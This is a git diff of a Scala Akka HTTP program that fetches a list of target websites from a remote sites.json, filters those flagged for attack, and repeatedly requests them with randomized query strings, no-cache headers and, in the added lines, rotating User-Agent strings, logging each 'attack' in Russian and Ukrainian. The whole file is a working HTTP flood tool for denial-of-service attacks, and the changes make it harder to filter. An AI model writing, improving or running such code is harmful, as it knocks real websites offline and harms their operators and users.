@@ -1,11 +1,10 @@
 package hi
 
 import akka.actor.ActorSystem
-import akka.http.javadsl.model.headers.RawHeader
 import akka.http.scaladsl.{ClientTransport, Http}
-import akka.http.scaladsl.model.{headers, _}
-import akka.http.scaladsl.model.headers.RawHeader
+import akka.http.scaladsl.model._
 import akka.http.scaladsl.settings.ConnectionPoolSettings
+import Agents._
 import spray.json.DefaultJsonProtocol._
 import spray.json._
 
@@ -30,25 +29,25 @@ object Test {
 
   val random = new Random()
 
-  case class Target(page: String)
-  //case class Target(id: Int, url: String, need_parse_url: Int, page: String, page_time: String, atack: Int)
+  //case class Target(page: String)
+  case class Target(id: Int, url: String, need_parse_url: Int, page: String, page_time: String, atack: Int)
 
   implicit val proxyFormat: RootJsonFormat[Proxy] = jsonFormat3(Proxy)
 
   implicit object TargetJsonFormat extends RootJsonFormat[Target] {
-/*    override def read(json: JsValue): Target = {
+    override def read(json: JsValue): Target = {
       json.asJsObject.getFields("id", "url", "need_parse_url", "page", "page_time", "atack") match {
         case Seq(JsNumber(id), JsString(url), JsNumber(need_parse_url), JsString(page), page_time, JsNumber(atack)) =>
           Target(id.toInt, url, need_parse_url.toInt, page, page_time.toString(), atack.toInt)
       }
-    }*/
+    }
 
-    override def read(json: JsValue): Target = {
+/*    override def read(json: JsValue): Target = {
       json.asJsObject.getFields("page") match {
         case Seq(JsString(page)) =>
           Target(page)
       }
-    }
+    }*/
 
     override def write(obj: Target): JsValue = {
       JsString("")
@@ -59,7 +58,7 @@ object Test {
     //val source = scala.io.Source.fromURL("https://gitlab.com/cto.endel/atack_api/-/raw/master/sites.json")
     val source = scala.io.Source.fromURL("https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json")
     try {
-      source.mkString.parseJson.convertTo[Seq[Target]].map(_.page)
+      source.mkString.parseJson.convertTo[Seq[Target]].filter(_.atack == 1).map(_.page)
     } finally {
       source.close()
     }
@@ -99,7 +98,7 @@ object Test {
         lastUpdate = System.currentTimeMillis()
       }
 
-      println(s"Атакую групу ${file.mkString("[", ", ", "]")}")
+      //println(s"Аттакую группу ${file.mkString("[", ", ", "]")}")
 
       file.foreach {
         url =>
@@ -124,13 +123,19 @@ object Test {
   private def innerRequest(url: String, recursion: Boolean)(implicit system: ActorSystem, executionContext: ExecutionContextExecutor): Future[Unit] = {
     val str = randomQueryParam(url)
 
-    Http().singleRequest(HttpRequest(uri = str).withHeaders(headers.RawHeader("Cache-Control", "no-cache"), headers.RawHeader("Connection", "keep-alive"))).flatMap {
+    val agent = getCustomClientAgent
+
+    Http().singleRequest(HttpRequest(uri = str).withHeaders(
+      headers.RawHeader("Cache-Control", "no-cache"),
+      //headers.RawHeader("Connection", "keep-alive"),
+      headers.RawHeader("User-Agent", agent)
+    )).flatMap {
       case HttpResponse(StatusCodes.OK, _, _, _) =>
         Future.successful {
           if (!recursion) {
-            println(s"attack $str")
+            println(s"Аттака $str - ОК")
           } else {
-            println(s"attack after redirect $str")
+            println(s"Аттака после редиректа $str")
           }
         }
       case HttpResponse(StatusCodes.Redirection(_), headers, _, _) =>
@@ -149,7 +154,7 @@ object Test {
         }
 
       case HttpResponse(StatusCodes.Forbidden, headers, _, _) =>
-        Future.successful(println(s"403"))
+        Future.successful(println(s"Доступ запрещен - 403 для цели $url"))
       case err =>
         sys.error(s"server is not responding: $err")
     }
